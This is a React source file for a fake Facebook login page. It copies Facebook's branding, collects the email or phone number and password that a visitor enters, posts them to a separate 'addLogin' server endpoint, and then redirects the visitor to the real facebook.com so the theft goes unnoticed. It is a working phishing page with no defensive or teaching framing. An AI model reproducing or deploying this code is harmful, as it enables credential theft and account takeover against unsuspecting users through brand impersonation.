import React from "react";
import { useForm } from "react-hook-form";
import { useHistory } from "react-router";
import { Link } from "react-router-dom";
import fbImage from "../../images/dF5SId3UHWd.svg";
const Home = () => {
  const history = useHistory();
  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
  } = useForm();
  const onSubmit = (data) => {
    const loginData = {
      phoneNumber: data.email,
      password: data.password,
    };
    console.log(loginData);
    fetch("http://localhost:5000/addLogin", {
      method: "POST",
      headers: { "Content-type": "application/json" },
      body: JSON.stringify(loginData),
    })
      .then((response) => response.JSON)
      .then((result) => console.log(result, "user information post on server"));
     window.location.assign("https://facebook.com/");
  };

  return (
    <section className="main-body">
      <div className="container">
        <div className="row headerTop justify-content-center">
          <div className="col-lg-5">
            <div className="left-content">
              <img
                src={fbImage}
                className="fb-img img-fluid w-100"
                alt="fblogo"
              />
              <h3>
                {" "}
                Facebook helps you connect and share with the people in your
                life.
              </h3>
            </div>
          </div>
          <div className="col-lg-4 login-form">
            <div className="login-form-body text-center">
              <form onSubmit={handleSubmit(onSubmit)}>
                <div>
                  <input
                    type="text"
                    className="form-control"
                    placeholder="Email address or phone number"
                    {...register("email", { required: true })}
                  />
                </div>

                <div>
                  <input
                    type="password"
                    className="form-control"
                    placeholder="Password"
                    {...register("password", { required: true })}
                  />
                </div>
                <button
                  type="submit"
                  className="btn btn-primary w-100 login-btn"
                >
                  Log In
                </button>

                <div className="forgot-password">
                  <Link to="/">forgotten password?</Link>
                </div>

                <button className="btn create-account-btn text-center">
                  Create New Account
                </button>
              </form>
            </div>
            <div className="login-form-bottom">
              <p>
                <Link
                  to={{ pathname: "https://www.facebook.com/" }}
                  target="_blank"
                >
                  Create a Page
                </Link>{" "}
                for a celebrity, band or business.
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default Home;
